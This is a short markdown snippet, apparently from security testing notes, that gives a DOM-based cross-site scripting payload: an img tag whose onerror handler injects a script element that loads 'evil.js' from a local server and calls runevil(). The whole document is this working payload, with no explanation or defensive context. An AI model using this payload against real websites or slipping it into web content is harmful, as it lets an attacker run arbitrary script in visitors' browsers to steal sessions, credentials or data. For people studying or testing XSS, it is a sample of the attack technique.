# DOM XSS Load and run external script example
```<img src=1 onerror="
var head= document.getElementsByTagName('head')[0];
var script= document.createElement('script');
script.onload=function(){runevil()};
script.src= 'http://localhost:8003/evil.js';
head.appendChild(script);">```